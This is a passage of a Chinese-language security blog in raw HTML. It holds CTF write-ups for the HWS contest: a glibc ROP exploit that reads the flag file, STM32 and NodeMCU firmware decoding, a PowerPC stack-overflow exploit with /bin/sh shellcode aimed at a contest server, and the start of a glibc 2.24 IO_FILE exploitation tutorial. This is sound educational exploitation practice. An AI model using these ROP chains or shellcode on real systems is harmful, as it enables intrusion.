class="string">&quot;3&quot;</span>)</span><br><span class="line"></span><br><span class="line">sh.send(<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&quot;check it : aaaaaaaa&quot;</span>)</span><br><span class="line">addr = u64(sh.recvuntil(<span class="string">&quot;\n&quot;</span>,drop=<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;addr:&#x27;</span>+<span class="built_in">hex</span>(addr)</span><br><span class="line">libc_base = addr - <span class="number">0x7b61e</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;libc_base:&#x27;</span>+<span class="built_in">hex</span>(libc_base)</span><br><span class="line">sh.recvuntil(<span class="string">&quot;name:&quot;</span>)</span><br><span class="line">sh.send(<span class="string">&quot;a&quot;</span>*<span class="number">0xc</span>+p64(elf.got[<span class="string">&#x27;exit&#x27;</span>]))</span><br><span class="line">sh.recvuntil(<span class="string">&quot;id:&quot;</span>)</span><br><span class="line">sh.sendline(<span class="built_in">str</span>(main))</span><br><span class="line">sh.recvuntil(<span class="string">&quot;info:&quot;</span>)</span><br><span class="line">sh.sendline(<span class="string">&quot;a&quot;</span>)</span><br><span class="line"></span><br><span class="line">rdi_ret = <span class="number">0x0000000000021112</span>+libc_base</span><br><span class="line">rsi_ret = <span class="number">0x00000000000202f8</span>+libc_base</span><br><span class="line">rdx_ret = <span class="number">0x0000000000001b92</span>+libc_base</span><br><span class="line">rbp_ret = <span class="number">0x000000000001f930</span>+libc_base</span><br><span class="line">rdx_rsi_ret = <span class="number">0x0000000000115189</span>+libc_base</span><br><span class="line">leave_ret = <span class="number">0x0000000000042361</span>+libc_base</span><br><span class="line">sh.recvuntil(<span class="string">&quot;code:&quot;</span>)</span><br><span class="line">sh.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">sh.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">sh.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">sh.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">payload = <span class="string">&quot;z&quot;</span>*<span class="number">0xc</span>+p64(elf.got[<span class="string">&#x27;exit&#x27;</span>])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil(<span class="string">&quot;id:&quot;</span>)</span><br><span class="line">sh.sendline(<span class="built_in">str</span>(<span class="number">0x400CF6</span>))</span><br><span class="line">sh.recvuntil(<span class="string">&quot;info:&quot;</span>)</span><br><span class="line">sh.sendline(<span class="string">&quot;a&quot;</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&quot;no check&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x21</span></span><br><span class="line">payload += p64(rdi_ret)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(rdx_rsi_ret)</span><br><span class="line">payload += p64(<span class="number">0x200</span>)</span><br><span class="line">payload += p64(<span class="number">0x6020A0</span>+<span class="number">0x200</span>)</span><br><span class="line">payload += p64(libc.symbols[<span class="string">&#x27;read&#x27;</span>]+libc_base)</span><br><span class="line">payload += p64(rbp_ret)</span><br><span class="line">payload += p64(<span class="number">0x6020A0</span>+<span class="number">0x200</span>)</span><br><span class="line">payload += p64(leave_ret)</span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;./flag\x00\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">payload += p64(rdi_ret)</span><br><span class="line">payload += p64(<span class="number">0x6020A0</span>+<span class="number">0x200</span>)</span><br><span class="line">payload += p64(rsi_ret)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(libc.symbols[<span class="string">&#x27;open&#x27;</span>]+libc_base)</span><br><span class="line">payload += p64(rdi_ret)</span><br><span class="line">payload += p64(<span class="number">3</span>)</span><br><span class="line">payload += p64(rsi_ret)</span><br><span class="line">payload += p64(<span class="number">0x6020A0</span>+<span class="number">0x300</span>)</span><br><span class="line">payload += p64(rdx_ret)</span><br><span class="line">payload += p64(<span class="number">0x30</span>)</span><br><span class="line">payload += p64(libc.symbols[<span class="string">&#x27;read&#x27;</span>]+libc_base)</span><br><span class="line">payload += p64(rdi_ret)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(rsi_ret)</span><br><span class="line">payload += p64(<span class="number">0x6020A0</span>+<span class="number">0x300</span>)</span><br><span class="line">payload += p64(rdx_ret)</span><br><span class="line">payload += p64(<span class="number">0x30</span>)</span><br><span class="line">payload += p64(libc.symbols[<span class="string">&#x27;write&#x27;</span>]+libc_base)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><blockquote><p>flag{f79047efe49d10a8001c5791c34f0dbb}</p></blockquote><h2 id="固件安全"><a href="#固件安全" class="headerlink" title="固件安全"></a>固件安全</h2><h3 id="NodeMCU"><a href="#NodeMCU" class="headerlink" title="NodeMCU"></a>NodeMCU</h3><p><del>妙用strings</del>固件分析 <code>strings nodemcu.bin</code> :</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210202220817.png" alt="image-20210202220817250"></p><blockquote><p>flag{6808dcf0-526e-11eb-92de-acde48001122}</p></blockquote><h3 id="STM"><a href="#STM" class="headerlink" title="STM"></a>STM</h3><p>解压得到 <code>.bin</code> 后缀文件，推测应该是 STM 固件分析题目。一番学习后，bin 文件可以转换为 hex 文件再丢 ida 里面分析，当然也可以直接丢 bin 文件分析，两者差别在加载是是否需要手动调加载地址。实际上 hex 文件自动加载地址是从 0x0 开始，也是不对，所以还是直接丢 bin 文件分析。</p><p>Ida32 打开，文件加载选项如下图：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210202202217.png" alt="image-20210202202209959"></p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210202211323.png" alt="image-20210202211323645"></p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210202222010.png"></p><p>按照上图设置完成后，一路 ok 返回加载 bin 文件，这是会有一个弹窗设置 ram rom 的地址，如果加载的是 hex 则没有这个窗口：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210202221948.png"></p><p>RAM start address：ram 起始地址，stm32 是0x20000000</p><p>RAM size：ram 长度， 64kb 内存是 0x10000</p><p>ROM start address：rom 起始地址，一般是 0x08000000 ，一开始是 0x08000101 加载出来不正确。</p><p>ROM size：rom 长度</p><p>Loading address：rom 装载地址</p><p>在文件开头疯狂按 d 调整数据格式，显示出程序入口 <code>0x8000101</code> ：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210202222511.png" alt="image-20210202222511538"></p><p>跳转过去之后在 <code>0x8000100</code> 处点 <code>c</code> 声明函数，程序结构就出来。字符串定位出 main 函数，大概看了下发现不用管，直接看另外一个字符串被调用的函数就是字符串的解密函数：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210202222844.png" alt="image-20210202222844241"></p><p>解密函数如下图，还有一些 sub 是取了符号表的功能函数：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210202222900.png" alt="image-20210202222859986"></p><h4 id="EXP-3"><a href="#EXP-3" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">enc = [<span class="number">0x7D</span>, <span class="number">0x77</span>, <span class="number">0x40</span>, <span class="number">0x7A</span>, <span class="number">0x66</span>, <span class="number">0x30</span>, <span class="number">0x2A</span>, <span class="number">0x2F</span>, <span class="number">0x28</span>, <span class="number">0x40</span>, </span><br><span class="line">  <span class="number">0x7E</span>, <span class="number">0x30</span>, <span class="number">0x33</span>, <span class="number">0x34</span>, <span class="number">0x2C</span>, <span class="number">0x2E</span>, <span class="number">0x2B</span>, <span class="number">0x28</span>, <span class="number">0x34</span>, <span class="number">0x30</span>, </span><br><span class="line">  <span class="number">0x30</span>, <span class="number">0x7C</span>, <span class="number">0x41</span>, <span class="number">0x34</span>, <span class="number">0x28</span>, <span class="number">0x33</span>, <span class="number">0x7E</span>, <span class="number">0x30</span>, <span class="number">0x34</span>, <span class="number">0x33</span>, </span><br><span class="line">  <span class="number">0x33</span>, <span class="number">0x30</span>, <span class="number">0x7E</span>, <span class="number">0x2F</span>, <span class="number">0x31</span>, <span class="number">0x2A</span>, <span class="number">0x41</span>, <span class="number">0x7F</span>, <span class="number">0x2F</span>, <span class="number">0x28</span>, </span><br><span class="line">  <span class="number">0x2E</span>, <span class="number">0x64</span>]</span><br><span class="line"><span class="keyword">for</span> word <span class="keyword">in</span> enc:</span><br><span class="line">print(<span class="built_in">chr</span>((word^<span class="number">0x1e</span>)+<span class="number">3</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><blockquote><p>flag{1749ac10-5389-11eb-90c1-001c427bd493}</p></blockquote><h3 id="PPPPPPC"><a href="#PPPPPPC" class="headerlink" title="PPPPPPC"></a>PPPPPPC</h3><blockquote><p><a href="https://4f-kira.github.io/2019/06/09/powerpc/">PowerPC栈溢出初探：从放弃到getshell</a></p></blockquote><p>Powerpc 32 位大端序，保护全关。比较明显的栈溢出：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210204223601.png" alt="image-20210204223601083"></p><p>cycli 生成字符串从报错信息中得知 padding 需要 0x13c 字节。</p><p>一开始是想用 bss 区的 shellcode ，因为地址已知，直接覆盖跳转，但是遇到问题是 strcpy 会遇到 \x00 截断，而 shellcode 中将 r0 设置为 11 时高位必定为 0x00，sc 指令中间也是有 0x00 。</p><p>由于 qemu 不随机化，本地调试观察报错信息，发现会将各个寄存器值以及一些应该是栈信息：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210204230502.png" alt="image-20210204230502810"></p><p>这个地址是栈上地址，然后调试观察 shellcode 写入地址距离，计算出 shellocode 在栈上的地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.binary = <span class="string">&quot;PPPPPPC&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;r&quot;</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;183.129.189.60&quot;</span>, <span class="number">10039</span>)</span><br><span class="line"><span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;l&quot;</span>:</span><br><span class="line">    p = process([<span class="string">&quot;./qemu-ppc-static&quot;</span>, <span class="string">&quot;PPPPPPC&quot;</span>])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process([<span class="string">&quot;./qemu-ppc-static&quot;</span>, <span class="string">&quot;-g&quot;</span>, <span class="string">&quot;1234&quot;</span>, <span class="string">&quot;-L&quot;</span>, <span class="string">&quot;/usr/arm-linux-gnueabi&quot;</span>, <span class="string">&quot;PPPPPPC&quot;</span>])</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;PPPPPPC&quot;</span>)</span><br><span class="line"></span><br><span class="line">cycli = <span class="string">&quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaai&quot;</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&quot;\x7c\x3f\x0b\x78&quot;</span> <span class="comment">#/*mr r31,r1*/</span></span><br><span class="line">shellcode +=<span class="string">&quot;\x7c\xa5\x2a\x79&quot;</span> <span class="comment">#/*xor. r5,r5,r5*/</span></span><br><span class="line">shellcode +=<span class="string">&quot;\x42\x40\xff\xf9&quot;</span> <span class="comment">#/*bdzl+ 10000454&lt; main&gt;*/</span></span><br><span class="line">shellcode +=<span class="string">&quot;\x7f\x08\x02\xa6&quot;</span> <span class="comment">#/*mflr r24*/</span></span><br><span class="line">shellcode +=<span class="string">&quot;\x3b\x18\x01\x34&quot;</span> <span class="comment">#/*addi r24,r24,308*/</span></span><br><span class="line">shellcode +=<span class="string">&quot;\x98\xb8\xfe\xfb&quot;</span> <span class="comment">#/*stb r5,-261(r24)*/</span></span><br><span class="line">shellcode +=<span class="string">&quot;\x38\x78\xfe\xf4&quot;</span> <span class="comment">#/*addi r3,r24,-268*/</span></span><br><span class="line">shellcode +=<span class="string">&quot;\x90\x61\xff\xf8&quot;</span> <span class="comment">#/*stw r3,-8(r1)*/</span></span><br><span class="line">shellcode +=<span class="string">&quot;\x38\x81\xff\xf8&quot;</span> <span class="comment">#/*addi r4,r1,-8*/</span></span><br><span class="line">shellcode +=<span class="string">&quot;\x90\xa1\xff\xfc&quot;</span> <span class="comment">#/*stw r5,-4(r1)*/</span></span><br><span class="line">shellcode +=<span class="string">&quot;\x3b\xc0\x01\x60&quot;</span> <span class="comment">#/*li r30,352*/</span></span><br><span class="line">shellcode +=<span class="string">&quot;\x7f\xc0\x2e\x70&quot;</span> <span class="comment">#/*srawi r0,r30,5*/</span></span><br><span class="line">shellcode +=<span class="string">&quot;\x44\xde\xad\xf2&quot;</span> <span class="comment">#/*.long 0x44deadf2*/</span></span><br><span class="line">shellcode +=<span class="string">&quot;/bin/shZ&quot;</span></span><br><span class="line"></span><br><span class="line">payload = shellcode.ljust(<span class="number">0x140</span>-<span class="number">4</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload += p32(<span class="number">0xf6fffab8</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line"><span class="comment">#p.send(cycli)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="decryption"><a href="#decryption" class="headerlink" title="decryption"></a>decryption</h3><p>打开 ida 分析算法：将明文加上下标序号后异或 0x23</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210202232311.png" alt="image-20210202232310980"></p><h4 id="EXP-4"><a href="#EXP-4" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">enc = [  <span class="number">0x12</span>, <span class="number">0x45</span>, <span class="number">0x10</span>, <span class="number">0x47</span>, <span class="number">0x19</span>, <span class="number">0x49</span>, <span class="number">0x49</span>, <span class="number">0x49</span>, <span class="number">0x1A</span>, <span class="number">0x4F</span>, </span><br><span class="line">  <span class="number">0x1C</span>, <span class="number">0x1E</span>, <span class="number">0x52</span>, <span class="number">0x66</span>, <span class="number">0x1D</span>, <span class="number">0x52</span>, <span class="number">0x66</span>, <span class="number">0x67</span>, <span class="number">0x68</span>, <span class="number">0x67</span>, </span><br><span class="line">  <span class="number">0x65</span>, <span class="number">0x6F</span>, <span class="number">0x5F</span>, <span class="number">0x59</span>, <span class="number">0x58</span>, <span class="number">0x5E</span>, <span class="number">0x6D</span>, <span class="number">0x70</span>, <span class="number">0xA1</span>, <span class="number">0x6E</span>, </span><br><span class="line">  <span class="number">0x70</span>, <span class="number">0xA3</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">    print(<span class="built_in">chr</span>((enc[i]^<span class="number">0x23</span>)-i),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><blockquote><p>1e1a6edc1c52e80b539127fccd48f05a</p></blockquote><h2 id="查阅资料"><a href="#查阅资料" class="headerlink" title="查阅资料"></a>查阅资料</h2><p>[使用 ida 逆向分析 stm32 的 bin 固件文件](</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> HWS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>glibc2.24下IO_FILE的利用</title>
      <link href="archives/7e703b17/"/>
      <url>archives/7e703b17/</url>
      
        <content type="html"><![CDATA[<h1 id="glibc-2-24-下-IO-FILE-的利用"><a href="#glibc-2-24-下-IO-FILE-的利用" class="headerlink" title="glibc 2.24 下 IO_FILE 的利用"></a>glibc 2.24 下 IO_FILE 的利用</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>在 2.24 版本的 glibc 中，全新加入了针对 IO_FILE_plus 的 vtable 劫持的检测措施，glibc 会在调用虚函数之前首先检查 vtable 地址的合法性。首先会验证 vtable 是否位于_IO_vtable 段中，如果满足条件就正常执行，否则会调用_IO_vtable_check 做进一步检查。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Check if unknown vtable pointers are permitted; otherwise,</span></span><br><span class="line"><span class="comment">   terminate the process.  */</span></span><br><span class="line"><span class="keyword">void</span> _IO_vtable_check (<span class="keyword">void</span>) attribute_hidden;</span><br><span class="line"><span class="comment">/* Perform vtable pointer validation.  If validation fails, terminate</span></span><br><span class="line"><span class="comment">   the process.  */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *</span></span><br><span class="line"><span class="class"><span class="title">IO_validate_vtable</span> (<span class="title">const</span> <span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* Fast path: The vtable pointer is within the __libc_IO_vtables</span></span><br><span class="line"><span class="comment">     section.  */</span></span><br><span class="line">  <span class="keyword">uintptr_t</span> section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;</span><br><span class="line">  <span class="keyword">uintptr_t</span> ptr = (<span class="keyword">uintptr_t</span>) vtable;</span><br><span class="line">  <span class="keyword">uintptr_t</span> offset = ptr - (<span class="keyword">uintptr_t</span>) __start___libc_IO_vtables;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (offset &gt;= section_length))</span><br><span class="line">    <span class="comment">/* The vtable pointer is not in the expected section.  Use the</span></span><br><span class="line"><span class="comment">       slow path, which will terminate the process if necessary.  */</span></span><br><span class="line">    _IO_vtable_check ();</span><br><span class="line">  <span class="keyword">return</span> vtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>计算 <code>section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;</code>，紧接着会判断 vtable - __start___libc_IO_vtables 的 offset ，如果这个 offset 大于 section_length , 即大于 <code>__stop___libc_IO_vtables - __start___libc_IO_vtables</code> 那么就会调用 <code>_IO_vtable_check()</code> 这个函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> attribute_hidden</span><br><span class="line">_IO_vtable_check (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> SHARED</span></span><br><span class="line">  <span class="comment">/* Honor the compatibility flag.  */</span></span><br><span class="line">  <span class="keyword">void</span> (*flag) (<span class="keyword">void</span>) = atomic_load_relaxed (&amp;IO_accept_foreign_vtables);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (flag);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="keyword">if</span> (flag == &amp;_IO_vtable_check)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* In case this libc copy is in a non-default namespace, we always</span></span><br><span class="line"><span class="comment">     need to accept foreign vtables because there is always a</span></span><br><span class="line"><span class="comment">     possibility that FILE * objects are passed across the linking</span></span><br><span class="line"><span class="comment">     boundary.  */</span></span><br><span class="line">  &#123;</span><br><span class="line">    Dl_info di;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l</span>;</span></span><br><span class="line">    <span class="keyword">if</span> (_dl_open_hook != <span class="literal">NULL</span></span><br><span class="line">        || (_dl_addr (_IO_vtable_check, &amp;di, &amp;l, <span class="literal">NULL</span>) != <span class="number">0</span></span><br><span class="line">            &amp;&amp; l-&gt;l_ns != LM_ID_BASE))</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span> <span class="comment">/* !SHARED */</span></span></span><br><span class="line">  <span class="comment">/* We cannot perform vtable validation in the static dlopen case</span></span><br><span class="line"><span class="comment">     because FILE * handles might be passed back and forth across the</span></span><br><span class="line"><span class="comment">     boundary.  Therefore, we disable checking in this case.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__dlopen != <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  __libc_fatal (<span class="string">&quot;Fatal error: glibc detected an invalid stdio handle\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果 vtable 是非法的，那么会引发 abort。</p><p>这里的检查使得以往使用 vtable 进行利用的技术很难实现</p><h2 id="新的利用技术"><a href="#新的利用技术" class="headerlink" title="新的利用技术"></a>新的利用技术</h2><h3 id="fileno-与缓冲区的相关利用"><a href="#fileno-与缓冲区的相关利用" class="headerlink" title="fileno 与缓冲区的相关利用"></a>fileno 与缓冲区的相关利用</h3><blockquote><p>劫持 _IO_FILE  结构体的 <code>_IO_buf_base</code>和<code>_IO_buf_end</code> 实现任意地址写</p></blockquote><p>在 vtable 难以被利用之后，利用的关注点从 vtable 转移到 _IO_FILE 结构内部的域中。 前面介绍过 _IO_FILE 在使用标准 IO 库时会进行创建并负责维护一些相关信息，其中有一些域是表示调用诸如 fwrite、fread 等函数时写入地址或读取地址的，如果可以控制这些数据就可以实现任意地址写或任意地址读。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> _flags;       <span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_ptr;   <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_end;   <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_base;  <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_base; <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_ptr;  <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_end;  <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_base;   <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_end;    <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> _fileno;</span><br><span class="line">  <span class="keyword">int</span> _flags2;</span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>因为进程中包含了系统默认的三个文件流 stdin\stdout\stderr，因此这种方式可以不需要进程中存在文件操作，通过 scanf\printf 一样可以进行利用。</p><p>在 _IO_FILE 中 _IO_buf_base 表示操作的起始地址，_IO_buf_end 表示结束地址，通过控制这两个数据可以实现控制读写的操作。</p><h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><p>简单的观察一下_IO_FILE 对于调用 scanf 的作用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdio.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span 